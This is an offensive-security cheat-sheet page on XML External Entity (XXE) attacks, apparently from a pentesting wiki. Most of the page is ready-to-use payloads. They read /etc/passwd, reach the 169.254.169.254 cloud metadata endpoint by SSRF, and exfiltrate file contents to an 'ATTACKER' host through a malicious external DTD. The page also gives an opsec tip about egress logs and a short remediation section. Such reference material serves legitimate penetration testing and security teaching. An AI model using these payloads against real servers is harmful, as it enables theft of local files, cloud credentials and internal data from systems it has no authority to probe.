---
tags:
  - Web
---

# :material-xml: XML External Entity (XXE)

<span class="pill pill-hard">file read + SSRF</span> <span class="pill pill-info">web</span>

If the server parses XML with external entities enabled, you can read local files, hit internal services, and sometimes reach RCE.

!!! abstract "TL;DR"
    Anywhere XML is accepted (SOAP, SAML, SVG, DOCX, `Content-Type: application/xml`), declare a `DOCTYPE` with an external entity and reference it in a value that gets reflected.

## :material-file-eye: Classic file read

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<root><name>&x;</name></root>
```

The parser inlines the file into `&x;`, which the app echoes back.

## :material-server-network: SSRF via XXE

```xml
<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">
```

Reach cloud metadata and internal hosts — see [SSRF](ssrf.md).

## :material-eye-off: Blind / OOB exfiltration

No reflection? Exfil via an external DTD you host:

```xml
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://ATTACKER/evil.dtd"> %ext; ]>
```

```dtd
<!-- evil.dtd -->
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % go "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?x=%f;'>">
%go; %send;
```

## :material-file-image: XXE via SVG / Office

Upload an `.svg` or a crafted `.docx` (it's a zip of XML) with the same `DOCTYPE` — image thumbnailers and document converters parse it server-side.

!!! opsec "OOB leaves DNS/HTTP trails"
    Blind XXE beacons to your host — use a domain you control and expect it in the target's egress logs.

## :material-shield-check: Remediation

- Disable DOCTYPE / external entities in the parser (`disallow-doctype-decl`, `FEATURE_SECURE_PROCESSING`).
- Prefer JSON; if XML is required, use a hardened, patched parser.

## :material-link-variant: Related

- Pivots into [SSRF](ssrf.md) and cloud [AWS](../cloud/aws.md) metadata theft.
- Often lands in [File Upload](file-upload.md) (SVG/DOCX) flows.
- Reference: [PortSwigger XXE](https://portswigger.net/web-security/xxe).
